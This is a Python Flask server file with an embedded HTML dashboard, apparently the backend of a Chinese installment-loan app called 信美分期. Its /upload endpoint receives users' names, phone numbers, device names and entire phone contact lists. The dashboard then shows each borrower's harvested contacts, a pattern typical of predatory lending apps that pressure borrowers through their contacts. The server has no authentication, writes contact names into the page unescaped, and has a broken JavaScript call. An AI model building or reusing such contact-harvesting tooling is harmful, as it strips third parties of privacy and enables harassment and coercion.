"""信美分期 — 通讯录接收服务器

启动方式：
    pip install flask
    python server.py

手机端上传地址：http://<本机IP>:8080/upload
查看数据：浏览器打开 http://localhost:8080
"""

import json
import datetime
from flask import Flask, request, render_template_string

app = Flask(__name__)
records = []

HTML = """<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>信美分期 — 授信数据中心</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body { font-family: -apple-system, 'PingFang SC', 'Microsoft YaHei', sans-serif; background: #0A0A0A; color: #E0E0E0; min-height: 100vh; }
  .header { background: linear-gradient(135deg, #1A1A2E, #16213E); padding: 28px 24px; text-align: center; border-bottom: 1px solid rgba(212,175,55,.3); }
  .header h1 { font-size: 26px; font-weight: 800; background: linear-gradient(135deg, #D4AF37, #FFF8DC, #C9A84C); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: 4px; }
  .header p { color: rgba(212,175,55,.6); font-size: 13px; margin-top: 6px; letter-spacing: 2px; }
  .stats { display: flex; gap: 12px; justify-content: center; margin: 20px 16px; flex-wrap: wrap; }
  .stat-card { background: #1A1A2E; border: 1px solid rgba(212,175,55,.2); border-radius: 12px; padding: 16px 24px; text-align: center; min-width: 100px; }
  .stat-card .num { font-size: 28px; font-weight: 800; color: #D4AF37; }
  .stat-card .label { font-size: 12px; color: rgba(255,255,255,.5); margin-top: 4px; }

  /* 上传人筛选 */
  .filter-bar { display: flex; gap: 10px; padding: 0 16px; margin-bottom: 16px; flex-wrap: wrap; align-items: center; }
  .filter-bar .chip { padding: 8px 18px; border-radius: 20px; font-size: 13px; cursor: pointer; border: 1px solid rgba(212,175,55,.3); background: #1A1A2E; color: rgba(255,255,255,.7); transition: all .2s; user-select: none; }
  .filter-bar .chip:hover { border-color: #D4AF37; color: #D4AF37; }
  .filter-bar .chip.active { background: linear-gradient(135deg, #D4AF37, #8B6914); color: #fff; border-color: transparent; font-weight: 600; }
  .filter-bar .label { color: rgba(255,255,255,.4); font-size: 12px; letter-spacing: 2px; }

  /* 联系人卡片 */
  .cards { padding: 0 16px 40px; display: grid; grid-template-columns: repeat(auto-fill, minmax(340px, 1fr)); gap: 12px; }
  .card { background: #1A1A2E; border-radius: 14px; overflow: hidden; border: 1px solid rgba(255,255,255,.06); transition: all .2s; }
  .card:hover { border-color: rgba(212,175,55,.3); transform: translateY(-2px); box-shadow: 0 12px 30px rgba(0,0,0,.4); }
  .card-header { padding: 16px 18px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,.06); background: linear-gradient(135deg, rgba(212,175,55,.08), transparent); }
  .card-header .name { font-weight: 700; font-size: 15px; color: #D4AF37; }
  .card-header .phone { font-size: 12px; color: rgba(255,255,255,.5); }
  .card-body { padding: 6px 0; max-height: 300px; overflow-y: auto; }
  .card-body .row { display: flex; justify-content: space-between; padding: 8px 18px; font-size: 13px; }
  .card-body .row:hover { background: rgba(255,255,255,.03); }
  .card-body .row .cname { color: #E0E0E0; }
  .card-body .row .cphone { color: rgba(255,255,255,.4); font-size: 12px; }
  .card-body .row .extra { color: rgba(255,255,255,.25); font-size: 11px; margin-left: 8px; }

  .empty { text-align: center; padding: 80px 20px; color: rgba(255,255,255,.3); }
  .empty .icon { font-size: 60px; margin-bottom: 16px; opacity: .3; }

  /* 详情弹窗 */
  .modal { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,.7); z-index: 999; justify-content: center; align-items: center; }
  .modal.show { display: flex; }
  .modal-content { background: #1A1A2E; border: 1px solid rgba(212,175,55,.3); border-radius: 16px; width: 90%; max-width: 520px; max-height: 75vh; overflow-y: auto; }
  .modal-header { padding: 18px 20px; border-bottom: 1px solid rgba(255,255,255,.06); display: flex; justify-content: space-between; align-items: center; }
  .modal-header h3 { color: #D4AF37; font-size: 18px; }
  .modal-close { background: none; border: 1px solid rgba(255,255,255,.2); color: #fff; width: 32px; height: 32px; border-radius: 50%; cursor: pointer; font-size: 16px; line-height: 1; }
  .modal-close:hover { border-color: #D4AF37; color: #D4AF37; }
  .modal-body { padding: 12px 0; }
  .modal-body .row { display: flex; justify-content: space-between; padding: 10px 20px; font-size: 14px; }
  .modal-body .row:hover { background: rgba(255,255,255,.03); }

  @media (max-width: 600px) {
    .cards { grid-template-columns: 1fr; padding: 0 10px 40px; }
    .card-body .row { font-size: 12px; padding: 6px 14px; }
    .header h1 { font-size: 22px; }
    .stat-card { padding: 12px 18px; }
    .stat-card .num { font-size: 22px; }
  }
</style>
</head>
<body>
<div class="header">
  <h1>信美分期</h1>
  <p>授信数据中心 · CREDIT DATA CENTER</p>
</div>

<div class="stats">
  <div class="stat-card">
    <div class="num">{{ records|length }}</div>
    <div class="label">提交总数</div>
  </div>
  <div class="stat-card">
    <div class="num">{{ uploaders|length }}</div>
    <div class="label">授信人数</div>
  </div>
  <div class="stat-card">
    <div class="num">{{ total_contacts }}</div>
    <div class="label">联系人合计</div>
  </div>
</div>

{% if records %}
<div class="filter-bar">
  <span class="label">筛选授信人</span>
  <span class="chip {{ 'active' if current_uploader == '' else '' }}" onclick="filter('')">全部</span>
  {% for u in uploaders %}
  <span class="chip {{ 'active' if current_uploader == u else '' }}" onclick="filter('{{ u }}')">{{ u }}</span>
  {% endfor %}
</div>
{% endif %}

<div class="cards">
{% for r in records %}
<div class="card">
  <div class="card-header" onclick="showDetail('{{ r.uploader }}')" style="cursor:pointer">
    <div>
      <div class="name">{{ r.uploader }}</div>
      <div style="font-size:11px;color:rgba(255,255,255,.35);margin-top:2px;">{{ r.deviceName }}</div>
    </div>
    <div style="text-align:right">
      <div class="phone">{{ r.get('phone', '') }}</div>
      <div style="font-size:10px;color:rgba(255,255,255,.25);margin-top:2px;">{{ r.server_time[:16] }}</div>
    </div>
  </div>
  <div class="card-body">
    {% for c in r.contacts[:8] %}
    <div class="row">
      <span class="cname">{{ c.displayName or (c.familyName + c.givenName) }}</span>
      <span>
        <span class="cphone">{{ c.phones|join(', ') if c.phones else '' }}</span>
        <span class="extra">{{ c.familyName }}</span>
      </span>
    </div>
    {% endfor %}
    {% if r.contacts|length > 8 %}
    <div class="row" style="justify-content:center;color:#D4AF37;cursor:pointer" onclick="showDetail('{{ r.uploader }}')">
      查看全部 {{ r.contacts|length }} 个联系人 →
    </div>
    {% endif %}
  </div>
</div>
{% else %}
<div class="empty">
  <div class="icon">📡</div>
  <div>等待授信数据上传……</div>
  <div style="font-size:12px;margin-top:8px;">手机端填写服务器地址后提交</div>
</div>
{% endfor %}
</div>

<!-- 详情弹窗 -->
<div class="modal" id="detailModal">
  <div class="modal-content">
    <div class="modal-header">
      <h3 id="modalTitle">授信详情</h3>
      <button class="modal-close" onclick="closeModal()">&times;</button>
    </div>
    <div class="modal-body" id="modalBody"></div>
  </div>
</div>

<script>
  let allRecords = {{ records_json|safe }};

  function filter(name) {
    const url = new URL(window.location);
    if (name === '') url.searchParams.delete('u');
    else url.searchParams.set('u', name);
    window.location = url.toString();
  }

  function showDetail(uploader) {
    const records = allRecords.filter(r => r.uploader === uploader);
    if (!records.length) return;
    const r = records[records.length - 1];  // 最新一条
    document.getElementById('modalTitle').textContent = r.uploader + ' · ' + (r.get('phone') || r.deviceName);
    let html = r.contacts.map(c =>
      `<div class="row">
        <span>${c.displayName || (c.familyName + c.givenName)}</span>
        <span style="color:rgba(255,255,255,.4);font-size:12px">${(c.phones||[]).join(', ')}</span>
      </div>`
    ).join('');
    html += `<div style="padding:16px 20px;color:rgba(255,255,255,.3);font-size:11px">
      设备: ${r.deviceName} · 手机: ${r.get('phone','')} · 上传: ${r.timestamp} · 共${r.contacts.length}人
    </div>`;
    document.getElementById('modalBody').innerHTML = html;
    document.getElementById('detailModal').classList.add('show');
  }

  function closeModal() {
    document.getElementById('detailModal').classList.remove('show');
  }

  document.getElementById('detailModal').addEventListener('click', function(e) {
    if (e.target === this) closeModal();
  });

  document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') closeModal();
  });
</script>
</body>
</html>"""


@app.route("/upload", methods=["POST"])
def upload():
    data = request.get_json(force=True)
    data["server_time"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    records.append(data)
    print(f"[收到] {data.get('uploader')} | {data.get('phone','')} | {data.get('deviceName')} | {len(data.get('contacts',[]))}个联系人")
    return {"ok": True, "count": len(records)}


@app.route("/")
def index():
    uploader = request.args.get("u", "")
    if uploader:
        filtered = [r for r in records if r.get("uploader") == uploader]
    else:
        filtered = list(records)

    uploaders = list(dict.fromkeys(r.get("uploader", "") for r in records))
    total_contacts = sum(len(r.get("contacts", [])) for r in records)

    return render_template_string(
        HTML,
        records=filtered,
        records_json=json.dumps(records, ensure_ascii=False),
        uploaders=uploaders,
        current_uploader=uploader,
        total_contacts=total_contacts,
    )


if __name__ == "__main__":
    print("=" * 55)
    print("  信美分期 — 授信数据中心")
    print("  查看页面：http://localhost:8080")
    print("  上传接口：http://<本机IP>:8080/upload")
    print("=" * 55)
    app.run(host="0.0.0.0", port=8080, debug=False)
